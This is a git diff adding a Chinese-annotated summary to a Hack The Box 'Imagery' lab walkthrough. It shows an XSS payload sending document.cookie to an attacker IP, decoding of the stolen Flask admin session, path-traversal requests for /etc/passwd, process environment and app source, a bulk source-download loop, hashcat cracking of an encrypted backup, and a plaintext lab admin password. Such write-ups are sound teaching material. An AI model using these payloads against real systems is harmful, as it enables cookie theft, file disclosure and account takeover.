@@ -1,4 +1,87 @@
 ## Imagery
+### 总结
+#### 本靶机的nc侦听获得GET请求，需要有触发条件才会反弹！！！
+```
+XSS 是 Cross-Site Scripting（跨站脚本攻击）
+await fetch(`${window.location.origin}/admin/bug_reports`);
+
+[★]$ curl http://10.129.242.164:8000/ -s | grep fetch|awk -F\` '{print$2}'
+
+<img src=x onerror='fetch("http://10.10.15.132:8000/?"+btoa(document.cookie))'></img>
+
+[★]$ echo c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFhVXlxQS5Ld1JPc1lvamZlMXdVcE5rVk5XNGdDZXhmVWM= | base64 -d
+session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc
+
+[★]$ flask-unsign -d -c .eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc
+{'displayId': 'a1b2c3d4', 'isAdmin': True, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'admin@imagery.htb'}
+
+GET /admin/get_system_log?log_identifier=admin%40imagery.htb.log HTTP/1.1
+GET /admin/get_system_log?log_identifier=../../../../../../../../../../etc/passwd HTTP/1.1
+GET /admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/environ HTTP/1.1         //当前进程
+GET /admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/cwd/app.py HTTP/1.1        //指向当前进程启动时所在的目录（也就是 Web 应用运行目录）
+
+//自动化成批量下载源码
+[★]$ mkdir app
+[★]$ cd app
+[~/app][★]$ for fn in "config" "app" "api_auth" "utils" "api_upload" "api_manage" "api_admin" "api_misc" "api_edit";do curl --path-as-is -s -b $'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc' http://10.129.13.194:8000/admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/cwd/${fn}.py -o ${fn}.py ;done
+
+[★]$ cat config.py |  grep db
+DATA_STORE_PATH = 'db.json' //发现数据库类型
+GET /admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/cwd/db.json         //得到用户和密码
+
+//burpsuite右键点击‘Copy as curl command (bash)‘ ，直接粘贴到terminal , 后面加个-o db.json 
+[★]$ curl --path-as-is -i -s -k -X $'GET' \
+    -H $'Host: 10.129.13.194:8000' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Referer: http://10.129.13.194:8000/' -H $'DNT: 1' -H $'Connection: keep-alive' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-GPC: 1' -H $'Priority: u=0, i' \
+    -b $'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc; {0a0cd94c-52ff-4e79-a0c4-d52033fa574e}=value' \
+    $'http://10.129.13.194:8000/admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/cwd/db.json' -o db.json
+[★]$ sed -n '/^{/,$p' db.json > db1.json
+[~/app][★]$ jq . db1.json
+
+//这个 api_edit.py 是 Web API 后端，用 subprocess 调 shell
+//subprocess 是 Python 用来“调用系统命令 / 启动外部程序”的模块; 让 Python 去执行 Linux 命令（ls、id、cat、bash 这种）
+[★]$ grep subprocess *.py
+api_edit.py:import subprocess
+api_edit.py:            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
+api_edit.py:            subprocess.run(command, capture_output=True, text=True, check=True)
+api_edit.py:            subprocess.run(command, capture_output=True, text=True, check=True)
+api_edit.py:            subprocess.run(command, capture_output=True, text=True, check=True)
+api_edit.py:            subprocess.run(command, capture_output=True, text=True, check=True)
+api_edit.py:    except subprocess.CalledProcessError as e:
+api_edit.py:        subprocess.run(command, capture_output=True, text=True, check=True)
+api_edit.py:    except subprocess.CalledProcessError as e:
+api_edit.py:        subprocess.run(command, capture_output=True, text=True, check=True)
+api_edit.py:    except subprocess.CalledProcessError as e:
+[~/app][★]$ git clone https://github.com/returntocorp/semgrep-rules.git 
+[~/app][★]$semgrep scan -f semgrep-rules/python/ . //结果同上
+
+//下载upback，"pyAesCrypt 6.1.1"使用aescrypt2hashcat.pl解开之后，还要使用rockyou.txt -m 22400解密
+[★]$ file web_20250806_120723.zip.aes
+web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
+//Google搜索 hashcat GitHub ;为什么"pyAesCrypt“要搜索'hashcat GitHub' -> /tools/aescrypt2hashcat.pl
+[~/10.129.242.164:8011][★]$ wget https://raw.githubusercontent.com/hashcat/hashcat/refs/heads/master/tools/aescrypt2hashcat.pl
+[~/10.129.242.164:8011][★]$ perl aescrypt2hashcat.pl web_20250806_120723.zip.aes
+[~/10.129.242.164:8011][★]$ vi imagery.aes
+$aescrypt$1*98b981e1c146c078b5462f09618b1341*0dd95827498496b8c8ca334d99b13c28*10c6eeb86b1d71475fc5d52ed52d67c20bd945d53b9ac0940866bc8dfbba72c1*e042d41d09ac2726044d63af1276c49e2c8d5f9eb9da32e58bf36cf4f0ad9c66
+[~/10.129.242.164:8011][★]$ cp /usr/share/wordlists/rockyou.txt.gz .
+[~/10.129.242.164:8011][★]$ gunzip rockyou.txt.gz
+[★]$ hashcat imagery.aes rockyou.txt -m 22400
+Google搜索:  decrypt with pyAesCrypt //有个AI生成的python代码 复制粘贴
+(.venv) [★]$ pip3 install pyAesCrypt
+(.venv) [★]$ python3 decrypt.py
+File 'web.zip.aes' decrypted successfully to 'decrypted.txt'
+(.venv) [~/web][★]$ file ../decrypted.txt
+../decrypted.txt: Zip archive data, at least v2.0 to extract, compression method=deflate
+(.venv) [~/web][★]$ 7z x ../decrypted.txt
+(.venv) [~/web/web][★]$ cat db.json
+
+//admin用户的密码没有用到
+web@Imagery:~/web$ cat bot/admin.py
+# ----- Config -----
+CHROME_BINARY = "/usr/bin/google-chrome"
+USERNAME = "admin@imagery.htb"
+PASSWORD = "strongsandofbeach"
+```
+————————————————————————————————
 ```
 [★]$ nmap -sV -sC 10.129.242.164
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-27 00:27 CST
@@ -872,7 +955,7 @@ web@Imagery:~/web$ dir
 api_admin.py  api_manage.py  app.py	db.json      static	  uploads
 api_auth.py   api_misc.py    bot	env	     system_logs  utils.py
 api_edit.py   api_upload.py  config.py	__pycache__  templates
-web@Imagery:~/web$ ps -ef |grep chr
+web@Imagery:~/web$ ps -ef |grep chr //-e= 显示 所有进程；-f= 完整格式输出（full format）
 web         6928    5867  0 06:29 pts/0    00:00:00 grep --color=auto chr
 
 ```
